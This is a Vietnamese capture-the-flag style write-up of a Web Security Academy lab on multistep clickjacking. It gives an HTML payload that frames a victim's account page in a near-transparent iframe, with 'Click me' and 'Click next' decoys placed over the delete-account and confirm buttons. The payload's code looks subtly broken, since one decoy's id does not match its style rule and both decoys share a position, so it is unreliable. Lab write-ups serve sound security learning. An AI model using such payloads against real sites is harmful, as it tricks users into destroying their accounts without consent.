# Multistep clickjacking



Mô tả::

+ Chức năng xóa tài khoản được bảo vệ bằng mã thông báo CSRF.
+ Một hộp thoại xác nhận bổ sung để bảo vệ khỏi bị kích chuột.
+ Nạn nhân sẽ nhấp vào bất kỳ thứ gì hiển thị từ nhấp chuột và sẽ tuân theo thứ tự cho các văn bản như Nhấp vào tôi trước và Nhấp vào tôi tiếp theo

Khi người dùng nhấp chuột vào xóa người dùng thì nó sẽ chuyển chúng ta đến một trang khác để xác nhận, vì thế chúng ta sẽ craft HTML như sau:

``` html
<style>
    #vuln_site{
        position:relative;
        width:1000px;
        height:800px;
        opacity:0.1;
        z-index:2;
    }
    #evil_site1{
        position:absolute;
        top:480px;
        left:50px;
        z-index:1;
    }
    #evil_site2{
        position:absolute;
        top:480px;
        left:50px;
        z-index:1;
    }
</style>
<div id="evil_site">Click me</div>
<div id="evil_site2">Click next</div>
<iframe id="vuln_site" src="https://0afa001404730540c146a81c00b40084.web-security-academy.net/my-account">
</iframe>
```

![image](https://user-images.githubusercontent.com/68894302/175211450-88f5022a-5af6-4a61-be8e-13c9f50b9cfa.png)

Theo thứ tự thì sau khi người dùng click vào `Click me` phía dưới chính là `Delete account` thì nó sẽ chuyển đến một trang xác nhận

![image](https://user-images.githubusercontent.com/68894302/175211957-389444bc-5caf-4dc0-8308-72372f81fe98.png)

Và lúc này nếu Click next chính là xác nhận xóa tài khoản. 

Vì thế cần thuyết phục người dùng nhấp hai lần. Trong thực tế, biết được hành vi của người dùng thông thường sẽ rất quan trọng để thuyết phục họ không chỉ nhấp chuột mà còn cả thứ tự nhấp chuột

![image-20220623115040451](C:/Users/tuandv/AppData/Roaming/Typora/typora-user-images/image-20220623115040451.png)